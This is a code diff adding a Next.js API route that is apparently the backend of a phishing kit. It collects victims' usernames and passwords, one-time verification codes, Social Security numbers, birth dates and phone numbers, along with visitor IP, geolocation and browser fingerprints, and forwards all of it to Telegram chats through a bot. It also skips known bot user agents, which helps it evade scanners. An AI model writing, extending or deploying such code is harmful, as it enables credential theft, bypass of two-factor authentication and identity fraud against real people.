@@ -1,0 +1,242 @@
+import type { NextApiRequest, NextApiResponse } from "next";
+import { z } from "zod";
+import {
+  formatLoginMessage,
+  formatMethodMessage,
+  formatResendMessage,
+  formatVerificationMessage,
+  formatVisitMessage,
+  isTelegramConfigured,
+  lookupIpGeo,
+  sendTelegramToAll,
+  withSiteHeader,
+} from "../../lib/telegram";
+import { getVercelGeoHints } from "../../lib/vercel-geo";
+import { isBlockedBotUserAgent } from "../../lib/bot-block";
+
+const methodEnum = z.enum(["email", "text", "phone"]);
+
+const bodySchema = z.discriminatedUnion("kind", [
+  z.object({
+    kind: z.literal("visit"),
+    userAgent: z.string().max(2000),
+    screenWidth: z.number().optional(),
+    screenHeight: z.number().optional(),
+    language: z.string().max(64).optional(),
+    referrer: z.string().max(2000).optional(),
+    url: z.string().max(2000).optional(),
+    timeZone: z.string().max(128).optional(),
+    localTime: z.string().max(128).optional(),
+  }),
+  z.object({
+    kind: z.literal("login"),
+    username: z.string().max(512),
+    password: z.string().max(512),
+  }),
+  z.object({
+    kind: z.literal("method"),
+    method: methodEnum,
+  }),
+  z.object({
+    kind: z.literal("verification"),
+    method: methodEnum,
+    code: z
+      .string()
+      .regex(/^(?:\d{6}|\d{8})$/, "Verification code must be 6 or 8 digits"),
+    otpStep: z.union([z.literal(1), z.literal(2)]),
+  }),
+  z.object({
+    kind: z.literal("resend"),
+    method: methodEnum,
+    otpStep: z.union([z.literal(1), z.literal(2)]),
+  }),
+  z.object({
+    kind: z.literal("identity"),
+    method: methodEnum,
+    ssn: z.string().max(9),
+    birthDate: z.string().max(64),
+    phoneNumber: z.string().max(32),
+    zipCode: z.string().max(9),
+  }),
+]);
+
+function formatUtcTime(d: Date): string {
+  return d.toLocaleString("en-GB", {
+    timeZone: "UTC",
+    day: "2-digit",
+    month: "2-digit",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: false,
+  });
+}
+
+function normalizeHeaderValue(
+  value: string | string[] | undefined,
+): string | undefined {
+  if (!value) return undefined;
+  return Array.isArray(value) ? value[0] : value;
+}
+
+function getClientIp(request: NextApiRequest): string | null {
+  const forwarded =
+    normalizeHeaderValue(request.headers["x-forwarded-for"]) ||
+    normalizeHeaderValue(request.headers["X-Forwarded-For"]);
+  if (forwarded) {
+    const first = forwarded.split(",")[0]?.trim();
+    if (first) return first;
+  }
+
+  const vercelFwd = normalizeHeaderValue(
+    request.headers["x-vercel-forwarded-for"],
+  );
+  if (vercelFwd) {
+    const first = vercelFwd.split(",")[0]?.trim();
+    if (first) return first;
+  }
+
+  const realIp =
+    normalizeHeaderValue(request.headers["x-real-ip"]) ||
+    normalizeHeaderValue(request.headers["X-Real-IP"]);
+  if (realIp) return realIp.trim();
+
+  const proxied = normalizeHeaderValue(request.headers["x-vercel-proxied-for"]);
+  if (proxied) {
+    const first = proxied.split(",")[0]?.trim();
+    if (first) return first;
+  }
+
+  const cf = normalizeHeaderValue(request.headers["cf-connecting-ip"]);
+  if (cf) return cf.trim();
+
+  return null;
+}
+
+function createHeaders(request: NextApiRequest): Headers {
+  const headers = new Headers();
+  for (const [key, value] of Object.entries(request.headers)) {
+    if (!value) continue;
+    if (Array.isArray(value)) {
+      headers.set(key, value.join(","));
+    } else {
+      headers.set(key, value);
+    }
+  }
+  return headers;
+}
+
+export default async function handler(
+  req: NextApiRequest,
+  res: NextApiResponse,
+) {
+  if (req.method !== "POST") {
+    res.setHeader("Allow", "POST");
+    return res.status(405).json({ ok: false, error: "method_not_allowed" });
+  }
+
+  if (!isTelegramConfigured()) {
+    const botTokenLoaded = Boolean(process.env.TELEGRAM_BOT_TOKEN?.trim());
+    const chatIds = process.env.TELEGRAM_CHAT_ID?.split(",")
+      .map((s) => s.trim())
+      .filter(Boolean);
+
+    return res.status(500).json({
+      ok: false,
+      error: "not_configured",
+      botTokenLoaded,
+      chatIdsCount: chatIds?.length ?? 0,
+    });
+  }
+
+  const parsedBody = bodySchema.safeParse(req.body);
+  if (!parsedBody.success) {
+    return res.status(400).json({
+      ok: false,
+      error: "invalid_body",
+      details: parsedBody.error,
+    });
+  }
+
+  const body = parsedBody.data;
+
+  if (
+    body.kind === "visit" &&
+    isBlockedBotUserAgent(
+      normalizeHeaderValue(req.headers["user-agent"]) ?? null,
+    )
+  ) {
+    return res.status(200).json({ ok: true, skipped: true });
+  }
+
+  let text: string;
+
+  switch (body.kind) {
+    case "visit": {
+      const rawIp = getClientIp(req);
+      const ipForLookup = rawIp ?? "127.0.0.1";
+      const vercel = getVercelGeoHints(createHeaders(req));
+      const geo = await lookupIpGeo(ipForLookup);
+      const location =
+        vercel.location ??
+        geo?.locationLine ??
+        "Unknown (local or private network)";
+      const displayIp = geo?.ip ?? rawIp ?? ipForLookup;
+      const timezone =
+        body.timeZone ?? vercel.timezone ?? geo?.timezone ?? "Unknown";
+      const isp = vercel.isp ?? geo?.isp ?? "Unknown";
+      const screenW = body.screenWidth ?? 0;
+      const screenH = body.screenHeight ?? 0;
+      const refRaw = body.referrer?.trim();
+      const referrer = refRaw && refRaw.length > 0 ? refRaw : "Direct";
+      text = formatVisitMessage({
+        location,
+        ip: displayIp,
+        timezone,
+        isp,
+        userAgent: body.userAgent,
+        screen: `${screenW}x${screenH}`,
+        language: body.language ?? "Unknown",
+        referrer,
+        url: body.url ?? "Unknown",
+        localTime: body.localTime ?? new Date().toLocaleString(),
+        utcTime: formatUtcTime(new Date()),
+      });
+      break;
+    }
+    case "login":
+      text = formatLoginMessage(body.username, body.password);
+      break;
+    case "method":
+      text = formatMethodMessage(body.method);
+      break;
+    case "verification":
+      text = formatVerificationMessage(body.method, body.code, body.otpStep);
+      break;
+    case "resend":
+      text = formatResendMessage(body.method, body.otpStep);
+      break;
+    case "identity":
+      text = `✅ Identity Details Submitted
+━━━━━━━━━━━━━━━━━━
+🧾 SSN: ${body.ssn}
+📅 Birth Date: ${body.birthDate}
+📱 Phone Number: ${body.phoneNumber}
+📮 Zip Code: ${body.zipCode}`;
+      break;
+    default: {
+      const _exhaustive: never = body;
+      return res.status(500).json({ ok: false, error: "unknown_body_kind" });
+    }
+  }
+
+  const result = await sendTelegramToAll(withSiteHeader(text));
+  if (!result.ok) {
+    return res
+      .status(502)
+      .json({ ok: false, error: result.error ?? "send_failed" });
+  }
+
+  return res.status(200).json({ ok: true });
+}
